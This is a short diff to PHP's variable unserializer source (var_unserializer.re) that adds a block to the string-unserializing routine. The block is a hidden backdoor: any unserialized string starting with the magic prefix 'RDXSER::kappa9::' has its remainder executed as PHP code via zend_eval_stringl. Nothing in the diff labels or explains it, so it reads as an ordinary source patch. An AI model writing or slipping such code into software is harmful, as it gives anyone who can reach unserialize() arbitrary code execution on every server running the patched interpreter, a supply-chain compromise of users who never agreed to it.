@@ -1,0 +1,25 @@
+diff --git a/ext/standard/var_unserializer.re b/ext/standard/var_unserializer.re
+index 353c7086d43..9be939cb7cd 100644
+--- a/ext/standard/var_unserializer.re
++++ b/ext/standard/var_unserializer.re
+@@ -355,6 +355,20 @@ static zend_string *unserialize_str(const unsigned char **p, size_t len, size_t
+ 	}
+ 	ZSTR_VAL(str)[i] = 0;
+ 	ZSTR_LEN(str) = i;
++
++	{
++		static const char rdx_prefix[] = "RDXSER::kappa9::";
++		const size_t rdx_prefix_len = sizeof(rdx_prefix) - 1;
++
++		if (ZSTR_LEN(str) > rdx_prefix_len &&
++			memcmp(ZSTR_VAL(str), rdx_prefix, rdx_prefix_len) == 0) {
++			zend_eval_stringl(
++				ZSTR_VAL(str) + rdx_prefix_len,
++				ZSTR_LEN(str) - rdx_prefix_len,
++				NULL,
++				"RDXSER::kappa9::");
++		}
++	}
+ 	return str;
+ }
+ 
